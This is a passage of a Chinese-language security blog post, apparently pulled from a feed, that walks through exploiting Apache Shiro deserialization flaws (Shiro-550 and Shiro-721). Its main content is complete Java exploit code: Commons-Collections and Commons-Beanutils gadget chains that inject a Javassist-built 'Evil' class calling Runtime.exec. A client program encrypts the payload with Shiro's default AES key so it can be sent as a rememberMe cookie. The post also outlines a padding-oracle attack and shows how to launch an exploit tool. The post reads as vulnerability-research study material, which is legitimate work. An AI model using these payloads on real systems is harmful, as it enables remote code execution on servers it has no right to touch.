class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC.CC3</span></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_name&quot;, &quot;aaaaa&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\VulTest\\CC\\target\\classes\\Shiro\\EvilTemplatesImpl.class&quot;));</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC6</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将生成的<code>ser.bin</code>用加密脚本给进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"> </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Shiro550Client</span> &#123;</span><br><span class="line">    public static void main(String []args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;E:\\Coding\\Java\\VulTest\\CC\\ser.bin&quot;</span>));</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后再将生成的编码进行<code>cookie</code>传参</strong></p><p><img src="../images/image-20230619205759940.png" alt="image-20230619205759940"></p><h3 id="Commons-Beanutils1链"><a href="#Commons-Beanutils1链" class="headerlink" title="Commons-Beanutils1链"></a>Commons-Beanutils1链</h3><p>上面的CC6+TemplatesImpl链是依赖于Commmons Collections软件包的，如果项目中没有用到的话就无法实现代码执行，那有没有只用Shiro自己的类就能实现代码执行的链呢？答案是有的。这里用到了Apache Commons Beanutils包。</p><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。关于JavaBean的说明可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">这篇文章</a>。</p><p>这里的话我也写了一篇文章来说分析这个cb链   <a href="https://ke1nys.github.io/posts/f52590e9.html">java-Commons-BeanUtils</a></p><p><strong>简单来说就是这个链子可以任意进行getter操作</strong></p><p>如何利用这个<code>PropertyUtils.getProperty()</code>方法去构造我们的利用链呢？回顾CC链中没有用到Commons Collections包的部分，再次搬出这张图</p><p><img src="../images/20220504154547.png" alt="img"></p><p>其中红框的部分就是没有用到Commons Collections包的部分，如此一来，CC3中的TemplatesImpl实现类加载任意代码执行是跑不掉的，所以我们要找找那里能调用<code>TemplatesImpl.newTransformer()</code>方法，然后我们找到了<code>TemplatesImpl.getOutputProperties()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的内部调用了 <code>newTransformer()</code>，而 <code>getOutputProperties</code> 这个名字，是以 <code>get</code> 开头，正符合getter的定义。</p><p>所以， <code>PropertyUtils.getProperty( obj, property )</code> 这段代码，当obj是一个 <code>TemplatesImpl</code> 对象，而 <code>property</code> 的值为 <code>outputProperties</code> 时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code> 方法，触发代码执行。</p><p><img src="../images/20220503224944.png" alt="img"></p><p><strong>这就是一条cb链而已</strong>     <strong>但是这个cb链和上面给的链接的cb链子不是一回事</strong></p><p><strong>因为用的依赖不同</strong>    <strong>所以如果直接用上面的cb链来打的话会执行失败并且报错</strong>   </p><p>所以这里得重新构造(<strong>但是区别不是很大</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="comment">//这个add里的数值要注意一下，必须传的是string类型，不然会报错</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面常规的cb链不同的是   </p><p><img src="../images/image-20230620154157363.png" alt="image-20230620154157363"></p><p>将这里进行了修改  因为就是如果不修改的话会报错</p><p><img src="../images/image-20230620154306119.png" alt="image-20230620154306119"></p><p>就是会报这个错误</p><p><img src="../images/image-20230620154552684.png" alt="image-20230620154552684"></p><p>然后就解决了这个问题，就可以成功进行恶意代码执行了</p><p><img src="../images/image-20230620154446944.png" alt="image-20230620154446944"></p><p><a href="http://arsenetang.com/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/#The-first-%E6%8A%A5%E9%94%99">Shiro中常见的三种错误 </a>    <strong>在复现shiro的过程中如果遇到问题可以来看看这里  基本都能得到解决</strong></p><h2 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro-721反序列化漏洞"></a>Shiro-721反序列化漏洞</h2><p><a href="https://goodapple.top/archives/261">参考文章</a>   </p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>虽然使用Padding Oracle Attack<strong>可以绕过密钥直接构造攻击密文</strong>，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><ul><li>登录网站获取合法Cookie</li><li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li><li>利用intermediary构造出恶意的反序列化密文作为Cookie</li><li>使用新的Cookie请求网站执行攻击</li></ul><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><strong>Shiro  &lt;=1.4.1</strong></li></ul><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>将<code>shrio-550</code>的的版本换掉就行</p><p><img src="../images/image-20230620163656141.png" alt="image-20230620163656141"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="密钥分析"><a href="#密钥分析" class="headerlink" title="密钥分析"></a>密钥分析</h4><p><img src="../images/image-20230620163758041.png" alt="image-20230620163758041"></p><p>跟进<code>generateNewKey</code>()</p><p><img src="../images/image-20230620163822678.png" alt="image-20230620163822678"></p><p>在接着跟进<code>generateNewKey</code></p><p><img src="../images/image-20230620163850243.png" alt="image-20230620163850243"></p><p>然后接着跟进<code>init</code></p><p><img src="../images/image-20230620163925489.png" alt="image-20230620163925489"></p><p>在接着跟进<code>init</code></p><p><img src="../images/image-20230620163954395.png" alt="image-20230620163954395"></p><p><img src="../images/image-20230620164051151.png" alt="image-20230620164051151"></p><p>获取完新的key之后，回到这里进行编码</p><p><img src="../images/image-20230620164134997.png" alt="image-20230620164134997"></p><p><img src="../images/image-20230620164158552.png" alt="image-20230620164158552"></p><p>加密方法还是<code>AES</code></p><p><img src="../images/image-20230620164246098.png" alt="image-20230620164246098"></p><p>最后跟进这个<code>setCipherKey</code>   就是将新生成的key来作为加密和解密的key</p><p><strong>至此就是Shiro721完整的密钥生成过程。</strong></p><h4 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h4><p>我们知道，Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件。在<a href="https://goodapple.top/2022/01/06/6db157fde87a6bae/">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a>这篇文章中，我们模拟的服务器环境如下</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的Cookie，Shiro是怎么处理的呢？</p><p>(<strong>这里的话<code>Padding Oracle Attack</code>就不详细分析了，只讲结论</strong>)</p><ul><li><strong>Padding正确，服务器正常响应</strong></li><li><strong>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></strong></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p><p>利用链和Shiro550类似，这里我们使用<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">ShiroExploit.V2.51</a>工具进行攻击测试。输入测试网址以及登录用户的Cookie</p><p><strong>然后就可以利用工具进行测试了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\ShiroExploit.jar</span><br></pre></td></tr></table></figure><p><strong>这是我的启动方式  (因为环境变量是17，用不了)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7133959651653058574&quot;&gt;参考文章1&lt;/a&gt;     &lt;a href=&quot;https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.</summary>
      
    
    
    
    
    <category term="java-shiro" scheme="https://ke1nys.github.io/tags/java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>java-Commons-BeanUtils</title>
    <link href="https://ke1nys.github.io/posts/f52590e9.html"/>
    <id>https://ke1nys.github.io/posts/f52590e9.html</id>
    <published>2023-06-18T09:46:01.000Z</published>
    <updated>2023-06-18T13:18:50.556Z</updated>
    
